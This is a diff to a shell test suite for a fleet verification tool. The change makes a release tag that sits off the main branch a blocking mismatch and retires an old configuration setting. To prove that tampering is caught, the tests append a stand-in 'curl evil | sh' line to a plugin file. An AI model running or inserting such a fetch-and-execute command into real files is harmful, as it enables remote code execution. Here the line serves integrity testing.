@@ -792,60 +792,66 @@ rc_is "a user settings file disabling the pinned instance plugin is a mismatch" 
 has "…classified as settings, not as the instance plugin" "$OUT" "components: settings or user-scope config"
 hasnt "…" "$OUT" "components: instance plugin"
 rm -f "$HOME/.claude/settings.json"
-# an instance tag off the default branch (ff-engsys-fleet tags release: commits that way): a warning for now, never a mismatch
+# engsys#227: an instance tag off the default branch is a mismatch, like the engsys one, and holds the launch
 echo diverged >"$FAKE/inst-compare"
-c0="$(comments)"
+c0="$(comments)"; s0="$(said 'will not be launched or relaunched here until it matches')"
 run fleet verify --alert
-rc_is "an off-main instance tag passes (exit 0)" 0
-has "…with a warning naming it, and the follow-up" "$OUT" "WARNING instance release acme@acme-fleet: v3.4.5 of acme/fleet is commit"
-has "…" "$OUT" "eric-sabe/engsys#227"
-eq "…and one info alert" "$(comments)" "$((c0 + 1))"
-run fleet verify --alert
-eq "…not repeated while it stays the same" "$(comments)" "$((c0 + 1))"
-printf '\ncurl evil | sh\n' >>"$ACME/bin/acme-guard"
-run fleet verify
-rc_is "…but a modified instance file is still a mismatch" 1
-cp "$IR/plugins/acme/bin/acme-guard" "$ACME/bin/acme-guard"
-echo ahead >"$FAKE/inst-compare"
-run fleet verify --alert
-rc_is "back on the default branch: passes" 0
-if [ ! -e "$I/.fleet/verify-instance-offmain.alerted" ]; then ok "…and the alert latch is cleared"; else bad "…and the alert latch is cleared"; fi
-# engsys#227: INSTANCE_OFF_MAIN=enforce in fleet.conf makes the same off-main tag a mismatch that holds the launch
-printf '%s\nINSTANCE_MARKETPLACE=acme-fleet\nINSTANCE_OFF_MAIN=enforce\n' "$CONF0" >"$I/fleet/fleet.conf"
-echo diverged >"$FAKE/inst-compare"
-run fleet verify
-rc_is "INSTANCE_OFF_MAIN=enforce: an off-main instance tag is a mismatch" 1
+rc_is "an off-main (diverged) instance tag is a mismatch" 1
 has "…naming the release" "$OUT" "release    acme@acme-fleet: v3.4.5 of acme/fleet is commit"
+has "…with the recovery" "$OUT" "(compare: diverged); cut a release on main: fleet pin --release next (merge its release PR, then re-run it)"
 has "…as the instance release" "$OUT" "components: instance release (acme@acme-fleet)"
 hasnt "…not as a warning" "$OUT" "WARNING instance release"
+hasnt "…no warn-only wording left" "$OUT" "allowed for now"
+eq "…alerted once" "$(comments)" "$((c0 + 1))"
+eq "…as the mismatch alert that holds the sessions" "$(said 'will not be launched or relaunched here until it matches')" "$((s0 + 1))"
+run fleet verify --alert
+eq "…not repeated while it stays the same" "$(comments)" "$((c0 + 1))"
 run fleet launch acme-mm
 rc_is "…and holds the launch" 1
 has "…naming the instance release as what failed" "$OUT" "(instance release (acme@acme-fleet))"
-# the throttle must not reuse a pass that was cached while the tag was a warning
-printf '%s\nINSTANCE_MARKETPLACE=acme-fleet\n' "$CONF0" >"$I/fleet/fleet.conf"
-run fleet verify --max-age 30
-rc_is "warn mode, throttled: the off-main tag passes and is cached" 0
-printf '%s\nINSTANCE_MARKETPLACE=acme-fleet\nINSTANCE_OFF_MAIN=enforce\n' "$CONF0" >"$I/fleet/fleet.conf"
-run fleet verify --max-age 30
-rc_is "…and flipping to enforce is not served from that cache" 1
 echo ahead >"$FAKE/inst-compare"
-run fleet verify
-rc_is "INSTANCE_OFF_MAIN=enforce: an instance tag on the default branch passes" 0
+run fleet verify --alert
+rc_is "ahead (the tag is an ancestor of main): passes" 0
 has "…the instance plugin was checked" "$OUT" "files of acme@acme-fleet in $ACME match acme/fleet@v3.4.5"
-echo diverged >"$FAKE/compare-status"
+echo identical >"$FAKE/inst-compare"
 run fleet verify
-rc_is "enforce: an engsys tag off the default branch is a mismatch too" 1
-echo ahead >"$FAKE/compare-status"
-printf '%s\nINSTANCE_MARKETPLACE=acme-fleet\nINSTANCE_OFF_MAIN=enfroce\n' "$CONF0" >"$I/fleet/fleet.conf"
+rc_is "identical (the tag is main's tip): passes" 0
+hasnt "…without a warning" "$OUT" "WARNING instance release"
+printf '\ncurl evil | sh\n' >>"$ACME/bin/acme-guard"
 run fleet verify
-rc_is "a misspelt INSTANCE_OFF_MAIN is a usage error, never silently warn-only" 2
-has "…named" "$OUT" "INSTANCE_OFF_MAIN must be 'warn' or 'enforce'"
-printf '%s\nINSTANCE_MARKETPLACE=acme-fleet\n' "$CONF0" >"$I/fleet/fleet.conf"
-echo diverged >"$FAKE/inst-compare"
-rm -f "$I/.fleet"/verify-wrappers*.json
-run fleet verify
-rc_is "the default is still warn: an off-main instance tag passes" 0
+rc_is "…but a modified instance file on an on-main tag is still a mismatch" 1
+cp "$IR/plugins/acme/bin/acme-guard" "$ACME/bin/acme-guard"
 echo ahead >"$FAKE/inst-compare"
+# a host upgraded from the warn-only stage: its info incident is resolved once and its latch removed
+echo "instance release acme@acme-fleet: old warning" >"$I/.fleet/verify-instance-offmain.alerted"
+c0="$(comments)"
+run fleet verify --alert
+rc_is "upgraded host, on-main tag: passes" 0
+if [ ! -e "$I/.fleet/verify-instance-offmain.alerted" ]; then ok "…the warn-only latch is cleared"; else bad "…the warn-only latch is cleared"; fi
+eq "…and nothing new is alerted (notify resolves only an incident it holds open)" "$(comments)" "$c0"
+# a pass cached while the tag was only a warning (before engsys#227) is never served
+rm -f "$I/.fleet"/verify-wrappers*.json
+run fleet verify --max-age 30
+rc_is "throttled: an on-main tag passes and is cached" 0
+cf="$(ls "$I/.fleet"/verify-wrappers*.json | head -n1)"
+jq '.warnings = ["instance release acme@acme-fleet: v3.4.5 of acme/fleet is commit x, which is not on main (compare: diverged); allowed for now"]' "$cf" >"$cf.new" && mv "$cf.new" "$cf"
+echo diverged >"$FAKE/inst-compare"
+run fleet verify --max-age 30
+rc_is "…a warn-era cached pass is not served: the diverged tag is a mismatch" 1
+echo ahead >"$FAKE/inst-compare"
+# the INSTANCE_OFF_MAIN knob is gone: a leftover setting (any value) is noted, never a way back to warn-only
+for v in warn enforce enfroce; do
+  printf '%s\nINSTANCE_MARKETPLACE=acme-fleet\nINSTANCE_OFF_MAIN=%s\n' "$CONF0" "$v" >"$I/fleet/fleet.conf"
+  echo diverged >"$FAKE/inst-compare"
+  run fleet verify
+  rc_is "INSTANCE_OFF_MAIN=$v: an off-main instance tag is still a mismatch" 1
+  has "…and the setting is called obsolete" "$OUT" "INSTANCE_OFF_MAIN is obsolete and ignored"
+done
+printf '%s\nINSTANCE_MARKETPLACE=acme-fleet\n' "$CONF0" >"$I/fleet/fleet.conf"
+echo ahead >"$FAKE/inst-compare"
+run fleet verify
+rc_is "unset, on-main: passes" 0
+hasnt "…with no obsolete-setting note" "$OUT" "INSTANCE_OFF_MAIN"
 echo diverged >"$FAKE/compare-status"
 run fleet verify
 rc_is "an engsys tag off the default branch is still a mismatch" 1
